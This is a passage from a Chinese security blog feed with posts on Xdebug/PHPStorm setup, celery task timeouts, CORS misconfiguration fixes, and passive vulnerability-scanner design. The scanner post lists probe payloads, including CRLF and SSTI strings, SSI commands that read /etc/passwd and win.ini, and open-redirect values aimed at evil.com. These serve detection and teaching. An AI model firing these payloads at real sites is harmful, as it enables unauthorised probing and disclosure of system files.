&lt;h3 id=&quot;phpstorm-interpreter无法拦截&quot;&gt;PHPStorm Interpreter无法拦截&lt;/h3&gt;

&lt;p&gt;另外，还有个大坑就是，在配置时遇到interpreter无法拦截：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PHPStorm报错：Cannot accept external Xdebug connection: Cannot evaluate expression'isset($_SERVER['PHP_IDE_CONFIG'])';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我看了下网上的说法，PHPStorm这个报错，是因为对于xdebug，zend_extension和extension不能同时启用，否则拦截启用不了（vscode似乎不受影响，我测的时候是可以拦截的）。&lt;/p&gt;

&lt;p&gt;导致此问题的一个可能原因是：服务器端的php.ini中配置了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extension=/path/xdebug.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;应该只保留下面一个，而且zend_extension需要绝对路径，extension不需要（至少win下是如此）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zend_extension=/path/xdebug.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;原文是xdebug.so，按理说win下应该改成xdebug.dll，网上答案全tm爬虫抄的。&lt;/p&gt;

&lt;p&gt;这里我受了误导，耽误了很长时间。因为我发现，鄙人在win下的php.ini针对xdebug，只配置了zend_extension，并没有如网上所述去设置extension。&lt;/p&gt;

&lt;p&gt;那么为什么还会出现这种情况呢？&lt;/p&gt;

&lt;p&gt;后来终于想明白了，最开始，我在phpstudy界面自己加载了扩展，当时就直接：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;网站-&amp;gt;管理-&amp;gt;PHP扩展-&amp;gt;勾选php_xdebug
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;但是这里的配置，我所使用的php版本的php.ini里是看不到的，也许是引用的全局配置，具体在哪儿我没搞明白。&lt;/p&gt;

&lt;p&gt;反正因为这个重复了，但是vscode没有影响，在PHPStorm就直接无法拦截了。&lt;/p&gt;

&lt;p&gt;当我&lt;strong&gt;取消勾选&lt;/strong&gt;这里的&lt;strong&gt;xdebug扩展（php_xdebug）&lt;/strong&gt;时，问题就解决了。&lt;/p&gt;

&lt;h4 id=&quot;xdebug下断点超时&quot;&gt;xdebug下断点超时&lt;/h4&gt;

&lt;p&gt;在调试的时候，看着看着variables突然就没了，回网页一看，结果发现页面超时500。
尝试修改php.ini的超时配置，并没有卵用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;max_execution_time=600
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;然后尝试直接在Apache（或者其他webserver）里做配置，成功解决超时问题：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FcgidIOTimeout 3600
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;QA:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;明天试试在引用处下断点，因为多空间引用可能走不到那一点，超时问题咋解决?
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;参考资料&quot;&gt;参考资料&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.pianshen.com/article/7930277434/&quot;&gt;《waiting for incoming connetcion with ide key 17142 问题解决
》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://ju.outofmemory.cn/entry/331038&quot;&gt;《MAMP 与 PhpStorm 远程调试
》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.jb51.net/article/128545.htm&quot;&gt;《使用PHPStorm+XDebug搭建单步调试环境》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/yizhou35/article/details/17043925&quot;&gt;《PHP Warning: Xdebug MUST be loaded as a Zend extension in Unknown on line 0 解决办法》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/universee/article/details/74516250&quot;&gt;《PhpStorm和WAMP配置调试参数，问题描述Error. Interpreter is not specified or invalid. Press “Fix” to edit your pro》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yjken/p/6555438.html&quot;&gt;《phpstorm中配置真正的远程调试(xdebug)》&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">这两天用idea审java比较顺手，顺便也迁移了下php调试环境，从vscode迁移到jetbrains家的phpstorm。以前习惯了纯搜索字符串，通过打印调试，没有动态hook变量看起来比较费劲。迁移过程中遇到一些坑，故此记录一下。</summary></entry><entry><title type="html">celery超时机制小结</title><link href="http://localhost:4000/coding/2019/10/08/celery-timeout-tips/" rel="alternate" type="text/html" title="celery超时机制小结" /><published>2019-10-08T11:35:00+08:00</published><updated>2019-10-08T11:35:00+08:00</updated><id>http://localhost:4000/coding/2019/10/08/celery-timeout-tips</id><content type="html" xml:base="http://localhost:4000/coding/2019/10/08/celery-timeout-tips/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;以前在使用celery任务时，老是被其超时机制不奏效所困扰，没有一个比较完美的解决方案。前两天琢磨出新的方案，故此借机梳理下过往细节。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;自带超时机制&quot;&gt;自带超时机制&lt;/h3&gt;

&lt;p&gt;首先，celery是自带超时机制的，主要分两种：&lt;/p&gt;

&lt;h4 id=&quot;软超时soft_time_limit&quot;&gt;软超时（soft_time_limit）&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(soft_time_limit=360)
def soft_time_out_try(args,url_array):
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在这种情况下，就算超时了，也是平滑过渡不会报错，推荐优先考虑。&lt;/p&gt;

&lt;p&gt;但是这种情况有个问题，在该机制下，如果函数中含有容易超时的第三方模块，是可能存在软超时以后，任务继续卡住的情况的。&lt;/p&gt;

&lt;p&gt;笔者在测试时使用的是celery v3，在升级v4后暂时没遇到这种情况。&lt;/p&gt;

&lt;h4 id=&quot;硬超时time_limit&quot;&gt;硬超时（time_limit）&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(time_limit=40)
def hard_time_out_try(args,url_array):
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在此情况下，超时阻断效果很给力，基本不会出现卡住的情况下。&lt;/p&gt;

&lt;p&gt;但是这种模式会直接抛出异常，不是特别友好。&lt;/p&gt;

&lt;p&gt;另外，在chord和group之类等聚合链路模式下，如果单个链路超时，会直接导致整体聚合失败，不会得到最终结果，也调用不了callback，比如下面的&lt;strong&gt;chord_return_value&lt;/strong&gt;函数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;results = chord( (hard_time_out_try_single.s(path, PASSWORD_DIC, host, port) for port in service_ports for path in plugin_www_paths ), chord_return_value.s(sys._getframe().f_code.co_name , url) )().get()

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;自定义超时机制&quot;&gt;自定义超时机制&lt;/h3&gt;

&lt;p&gt;如果celery自带的超时机制不能满足需求，我们可以尝试去构造监控，采用双保险避免模块超时。&lt;/p&gt;

&lt;h4 id=&quot;双保险之软超时优先&quot;&gt;双保险之软超时优先&lt;/h4&gt;

&lt;p&gt;先采用&lt;strong&gt;time_limit&lt;/strong&gt;进行最有效的阻断，再采用&lt;strong&gt;soft_time_limit&lt;/strong&gt;去处理抛出的错误。&lt;/p&gt;

&lt;p&gt;这样的话，&lt;strong&gt;优点&lt;/strong&gt;在于可以比较平滑的过度，适用于chord之类的聚合不会报错，&lt;strong&gt;缺点&lt;/strong&gt;在于会平白增加许多额外的task，会消耗更多人力和机器资源。&lt;/p&gt;

&lt;p&gt;具体案例如下（celery v3有时还是会出问题，celery v4未尝试）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(soft_time_limit=120)
def hard_time_out_try_pre(path, PASSWORD_DIC, host, port):
    try:
        result= hard_time_out_try_single.apply_async( args=(path, PASSWORD_DIC, host, port) )
        while True:
            if result.ready() or result.status == &quot;Failed&quot;:
                break
        r = result.get()
        return r

    except Exception,e:
        print e
        
@celery.task(time_limit=100)
def soft_time_out_try(args,url_array):
    pass

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;双保险之硬超时优先&quot;&gt;双保险之硬超时优先&lt;/h4&gt;

&lt;p&gt;跟前面不同，这里优点在于比较保险地杀死超时函数，没有一开始就直接武断的使用time_limit，而带有一定的缓冲效果。&lt;/p&gt;

&lt;p&gt;当然，这里是不太适用于chord之类需要结果聚合的场景。&lt;/p&gt;

&lt;p&gt;简单解释下，TimeLimitExceeded会直接杀掉进程，raise一个TimeLimitExceeded，不能被 task捕捉，所以应该两种方案配合使用，&lt;strong&gt;soft_time_limit&lt;/strong&gt;=小int，&lt;strong&gt;time_limit&lt;/strong&gt;=大int，使用soft试图关闭进程超时就会被干掉。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery.exceptions import SoftTimeLimitExceeded

@celery.task
def mytask():
    try:
        return time_out_try_single()
    except SoftTimeLimitExceeded:
        cleanup_in_a_hurry()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;使用信号处理遏制函数超时&quot;&gt;使用信号处理，遏制函数超时&lt;/h4&gt;

&lt;p&gt;具体流程如下，尝试了对遏制函数超时比较有效，暂时没发现副作用。&lt;/p&gt;

&lt;p&gt;但这里没能再次复现第三方模块超时的场景，后续如若遇到相应情况不能解决，会继续更新其他解决方案，具体流程如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;调用&lt;strong&gt;time_out_try_single&lt;/strong&gt;函数进行超时监控，使用sleep模拟函数执行超时&lt;/li&gt;
  &lt;li&gt;引入signal模块，设置handler捕获超时信息，返回断言错误&lt;/li&gt;
  &lt;li&gt;alarm(120)，设置120秒闹钟，函数调用超时120秒则直接返回&lt;/li&gt;
  &lt;li&gt;捕获异常，打印超时信息。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
import signal

def time_out_try_single(i):
    time.sleep(i%4)
    print &quot;%d within time&quot;%(i)
    return i

if __name__ == '__main__':
    def handler(signum, frame):
        raise AssertionError

    i = 0
    for i in range(1,10):
        try:
            signal.signal(signal.SIGALRM, handler)
            signal.alarm(120)
            time_out_try_single(i)
            i = i + 1
            signal.alarm(0)
        except AssertionError:
            print &quot;%d timeout&quot;%(i)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;参考文档&quot;&gt;参考文档&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit&quot;&gt;《setting-task_time_limit》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/5a969b067ce6&quot;&gt;《hard杀死soft》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.sina.com.cn/s/blog_63041bb80102uy5o.html&quot;&gt;《Python设置函数调用超时》&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="coding" /><summary type="html">以前在使用celery任务时，老是被其超时机制不奏效所困扰，没有一个比较完美的解决方案。前两天琢磨出新的方案，故此借机梳理下过往细节。</summary></entry><entry><title type="html">cors漏洞之123</title><link href="http://localhost:4000/vuln/2019/09/28/cors-tips/" rel="alternate" type="text/html" title="cors漏洞之123" /><published>2019-09-28T21:13:00+08:00</published><updated>2019-09-28T21:13:00+08:00</updated><id>http://localhost:4000/vuln/2019/09/28/cors-tips</id><content type="html" xml:base="http://localhost:4000/vuln/2019/09/28/cors-tips/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;cors漏洞要素&quot;&gt;cors漏洞要素&lt;/h3&gt;

&lt;p&gt;cors漏洞成功主要需要两个点，&lt;/p&gt;

&lt;p&gt;在Html Response头部里面：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: http://www.whitedomain.com
Access-Control-Allow-Origin: true or false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;或者同时具备：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Credentials这里是比较容易被忽略的，Credentials为false的话，数据包是不会带上&lt;strong&gt;传统的认证信息&lt;/strong&gt;，你获取到的敏感内容也是相对有限的。&lt;/p&gt;

&lt;p&gt;另外，cors漏洞也需要注意一点，你在构造测试点的时候，需要得到：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.whitedomain.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的域名是不能带上目录的，因为你实际上构造钓鱼页面的时候，是无法构造畸形Origin的。&lt;/p&gt;

&lt;p&gt;为啥呢，因为你从页面发送给后端的请求，浏览器会主动去解析过滤，如果在这里去构造畸形的域名，他会只取到host部分，不会处理目录，然后拿去给后端解析。&lt;/p&gt;

&lt;p&gt;比如说，浏览器会像下面这样处理去取host，由于需要配合通用后端过滤设置，需要www.whitedomain.com结尾的绕过尝试：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.evil.com/whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com\.whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com#www.whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com?www.whitedomain.com ===&amp;gt; 
www.evil.com 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;大概举几个例子就行，反正我这边暂时没找到可以绕过的尝试，后缀whitedomain.com，搞出来基本上取出来的真正host，也只能是whitedomain.com。&lt;/p&gt;

&lt;p&gt;这是啥意思呢？意思是你去构造畸形的域名，浏览器可能就直接过滤拦截了。
传到后端的，基本就是你想要构造的恶意目的域名。这时候，后端做好相应的防跨域配置和服务器配置，基本就可以稳定拦截了。&lt;/p&gt;

&lt;h3 id=&quot;修复方法&quot;&gt;修复方法&lt;/h3&gt;

&lt;p&gt;java后端配置举例（jetty版本）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public FilterRegistrationBean crossFilter()
{
FilterRegistrationBean registration = new FilterRegistrationBean();
registration.setFilter(new org.eclipse.jetty.servlets.CrossOriginFilter() );
registration.addInitParameter(name: &quot;allowOrigins&quot;, value: &quot;*.whitedomain.com&quot;);
registration.addInitParameter(name: &quot;allowMethods&quot;, value: &quot;GET,POST,HEAD&quot;);
registration.addInitParameter(name: &quot;allowHeaders&quot;, value: &quot;X-Requested-With,Content-Type,Accept,Origin&quot;);
registration.addUrlPatterns(&quot;/*&quot;);
registration.setName(&quot;cross-origin&quot;);
return registration;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;需要在pom.xml里配置的话:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;web-app&amp;gt;

    &amp;lt;filter&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;filter-class&amp;gt;org.eclipse.jetty.servlets.CrossOriginFilter&amp;lt;/filter-class&amp;gt;
    &amp;lt;/filter&amp;gt;
    &amp;lt;filter-mapping&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;url-pattern&amp;gt;/*&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/filter-mapping&amp;gt;

&amp;lt;/web-app&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;当然，如果遇到特殊情况，需要在前端直接配置，nodejs配置举例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 判断origin是否在域名白名单列表中

function isOriginAllowed(origin, allowedOrigin) {

if (_.isArray(allowedOrigin)) {

for(let i = 0; i &amp;lt; allowedOrigin.length; i++) {

if(isOriginAllowed(origin, allowedOrigin[i])) {

return true;

}

}

return false;

} else if (_.isString(allowedOrigin)) {

return origin === allowedOrigin;

} else if (allowedOrigin instanceof RegExp) {

return allowedOrigin.test(origin);

} else {

return !!allowedOrigin;

}

}

const ALLOW_ORIGIN = [ // 域名白名单

'*.whitedomain.com',

];

app.post('/formdata', function (req, res, next) {

let reqOrigin = req.headers.origin; // request响应头的origin属性

// 判断请求是否在域名白名单内

if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) {

// 设置CORS为请求的Origin值

res.header(&quot;Access-Control-Allow-Origin&quot;, reqOrigin);

//个人觉得下面一句根据业务而定，可设定可不设定。
res.header('Access-Control-Allow-Credentials', 'true');

// 你的业务代码逻辑代码 ...

// ...

} else {

res.send({ code: -2, msg: '非法请求' });

}

});
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。</summary></entry><entry><title type="html">浅谈被动漏扫思路</title><link href="http://localhost:4000/scanner/2019/08/15/axe-scanner-design/" rel="alternate" type="text/html" title="浅谈被动漏扫思路" /><published>2019-08-15T21:13:00+08:00</published><updated>2019-08-15T21:13:00+08:00</updated><id>http://localhost:4000/scanner/2019/08/15/axe-scanner-design</id><content type="html" xml:base="http://localhost:4000/scanner/2019/08/15/axe-scanner-design/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;sql注入&quot;&gt;SQL注入&lt;/h3&gt;
&lt;p&gt;对于SQLI注入，可以使用sqlmapapi进行检测。&lt;/p&gt;

&lt;p&gt;优点在于，对于一些带回显和延时注入，企业内部检测没有waf拦截，会较为准确的定位。&lt;/p&gt;

&lt;p&gt;缺点在于，对于这类检测，由于属于大规模扫描，一般会采用level和risk为初级的检测。当注入所需条件比较苛刻时，可能会覆盖不全，造成遗漏。&lt;/p&gt;

&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;
&lt;p&gt;对于XSS的检测的话，已经解决的有两个点，是针对反射性XSS和DOM型XSS的检测。&lt;/p&gt;

&lt;p&gt;以前对awvs一类的扫描器做过调研，通常是用变形的常用的payload去fuzz，检测效率是比较低的，也容易被拦截。&lt;/p&gt;

&lt;p&gt;针对反射性XSS（包含POST型存储XSS），采用的是检测部分特殊字符，两两成对，如果未曾过滤再去借助专门的XSS扫描器进行扫描，可尝试的字符如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'
&quot;
&amp;lt; 
&amp;gt; 
/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其实还可以做二次复检，加入敏感html标签再次尝试。这样检测成本提高不多，但会更准确一些。&lt;/p&gt;

&lt;p&gt;对于DOM型XSS检测，提供有两种方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;采用守护进程的方式去利用headless浏览器来hook渲染，从而检测出漏洞。
不过这种耗时比较长，有时候也因为浏览器渲染失败，以及同时发包量过大，导致内存崩溃漏掉部分漏洞。&lt;/li&gt;
  &lt;li&gt;采用类phamtomjs的引擎，直接增改数据包参数，像检测反射性XSS那样加入特殊字符，通过Ajax方式发送数据包，挨个去检测对比返回值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对存储型XSS，主要存在一个痛点，返回的页面不一定是输出XSS的点，那我们应该怎么办呢？&lt;/p&gt;

&lt;p&gt;个人有个想法，我们可以通过数据库临时表记录下每个打了暗桩的post数据包，通过md5生成的是随机的值，我们可以采用这两种写法：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A = payload+定位符+md5
B = 特殊字符+定位符+md5
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后在抓到的后续访问数据包中，如果response含有完整的A或者B，我们可以通过标记去寻找回溯存储型XSS的源头。&lt;/p&gt;

&lt;p&gt;但有人可能会说了，你这随意下暗桩，搞得满站都是垃圾数据怎么办？&lt;/p&gt;

&lt;p&gt;以前笔者就遇到过几次众测，个别人坏了规矩，登录后拿着扫描器一顿扫，搞得每个页面都在弹窗。&lt;/p&gt;

&lt;p&gt;当然这个问题sqlmap等工具也是存在的，但这跟工具本身没关系，是设计和用途的问题。&lt;/p&gt;

&lt;p&gt;这就需要业务扫描平台去做去重规则和黑名单限制了。&lt;/p&gt;

&lt;h3 id=&quot;越权漏洞&quot;&gt;越权漏洞&lt;/h3&gt;

&lt;p&gt;越权漏洞本身是不太好全自动化检测的，但我们可以做一些半自动化的工作，比如：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置多组关键参数对，交替去替换原request中的参数对，看是否会有关键的差异response返回。&lt;/li&gt;
  &lt;li&gt;采用混淆过的或者置空的cookie，看看返回数据是否与原response相同。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;敏感文件泄露&quot;&gt;敏感文件泄露&lt;/h3&gt;

&lt;p&gt;在web目录可能会存在敏感配置文件或者临时文件，我们需要去通过黑盒探测，做好防治工作。&lt;/p&gt;

&lt;p&gt;我们可以采用关键词命中、状态码命中、header命中等方式，多维度进行判断和探测，正确率会相对较高。&lt;/p&gt;

&lt;p&gt;目前已经有部分开源扫描器采用了这种方式，可以直接调用或者模拟使用它们的规则。&lt;/p&gt;

&lt;h3 id=&quot;命令执行漏洞&quot;&gt;命令执行漏洞&lt;/h3&gt;

&lt;p&gt;命令执行的判定主要是通过以下几种方式：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;通过回显，直接判断有没有读取到文件。&lt;/li&gt;
  &lt;li&gt;通过dns服务器，判断有无读取到漏洞主机的请求。&lt;/li&gt;
  &lt;li&gt;通过server反馈时差，判断是否执行了sleep。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是一般命令执行会有一定的过滤和其他限制，我们需要通过拼接和替换参数值的方式，去构造执行命令的语句，这时候我们就需要用payload去fuzz了。&lt;/p&gt;

&lt;h3 id=&quot;敏感信息泄露&quot;&gt;敏感信息泄露&lt;/h3&gt;

&lt;p&gt;对于敏感信息检测，可以通过关键词进行定位，方式主要有以下几种：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置信息&lt;/li&gt;
  &lt;li&gt;日志信息&lt;/li&gt;
  &lt;li&gt;敏感api和路径&lt;/li&gt;
  &lt;li&gt;cookie/token/明文密码/手机号等&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;crlf-注入&quot;&gt;CRLF 注入&lt;/h3&gt;

&lt;p&gt;检测是否成功注入header，这里有两个点需要注意：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;不建议使用敏感的头部参数，可以生造一个set-header键值对，也方便检测。&lt;/li&gt;
  &lt;li&gt;返回码需要为30x。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload：
%0aset-header：ceshi;%0a

关键词：
ceshi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssti-注入&quot;&gt;SSTI 注入&lt;/h3&gt;

&lt;p&gt;我们可以通过对response中的回显进行关键词匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$\{\{11 * 11\}\}

121
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssi-注入&quot;&gt;SSI 注入&lt;/h3&gt;

&lt;p&gt;检测方式类似于命令执行漏洞，采用替换参数值的方式，换取回显关键词和dns请求匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&amp;gt;
root

&amp;lt;!--#exec cmd=&quot;type c:\windows\win.ini&quot;--&amp;gt;
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;cors漏洞&quot;&gt;CORS漏洞&lt;/h3&gt;

&lt;p&gt;cors漏洞检测主要通过response中的header关键词，进行相应的定位匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.baidu.com

Access-Control-Allow-Origin: http://www.baidu.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;jsonp漏洞检测&quot;&gt;JSONP漏洞检测&lt;/h3&gt;

&lt;p&gt;jsonp漏洞需要依靠callback，利用场景简单提一下：&lt;/p&gt;

&lt;p&gt;在响应中回调函数被硬编码：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;基础函数调用&lt;/li&gt;
  &lt;li&gt;对象方法调用&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;动态调用回调函数：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;URL完全可控（GET变量）&lt;/li&gt;
  &lt;li&gt;URL部分可控（GET变量），但是附加有一个数字&lt;/li&gt;
  &lt;li&gt;URL可控，但最初不会显示在请求之中&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那我们的检测方法可以这么做，先判断header是否存在：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: application/json
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再通过关键词定位json数据中，是否含有敏感数据。&lt;/p&gt;

&lt;h3 id=&quot;websocket劫持检测&quot;&gt;WEBSOCKET劫持检测&lt;/h3&gt;

&lt;p&gt;对于该漏洞，我们需要先检测header中是否含有Sec-WebSocket-Accept字段。&lt;/p&gt;

&lt;p&gt;可以把Origin: https://www.baidu.com修改Origin: http://www.evil.com，若看到服务器端response status返回了 101，可以判定有漏洞。&lt;/p&gt;

&lt;h3 id=&quot;url跳转漏洞&quot;&gt;URL跳转漏洞&lt;/h3&gt;

&lt;p&gt;首先我们需要检测是否存在任意跳转漏洞，替换参数值为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www.evil.com
@www.evil.com
\www.evil.com
\.www.evil.com
#www.evil.com
www.evil.com?vulnweb.cn
http://www.evil.com
http://www.evil.com?vulnweb.cn
evil.com
http://evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后，首先我们可以检测状态码为30x的response数据包里，是否Location解析出的域名为evil.com，亦或是定位evil.com特有可控的关键词。&lt;/p&gt;

&lt;p&gt;其次，某些返回包可以能会通过中转页面，借助js进行跳转。&lt;/p&gt;

&lt;p&gt;这时，我们可以选择去页面检测meta-refresh标签，以及检测以下标签：&lt;/p&gt;

